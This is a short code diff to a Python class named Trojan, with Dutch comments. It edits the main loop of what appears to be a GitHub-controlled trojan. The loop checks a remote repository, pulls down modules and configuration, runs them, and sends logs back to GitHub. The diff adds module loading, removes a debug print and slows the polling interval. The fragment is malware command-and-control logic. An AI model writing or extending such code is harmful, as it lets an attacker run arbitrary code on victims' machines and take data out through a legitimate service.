@@ -27,12 +27,12 @@ class Trojan():
 
             else: 
                 if self.github_connectie.check_remote_repo():
+                    self.github_connectie.load_modules()
                     self.github_connectie.get_config()
                     self.run_modules()
-                    print("ik run de modules")
                     self.github_connectie.send_logs_to_github(self.id)
             
-            time.sleep(10)
+            time.sleep(30)
 
         
     
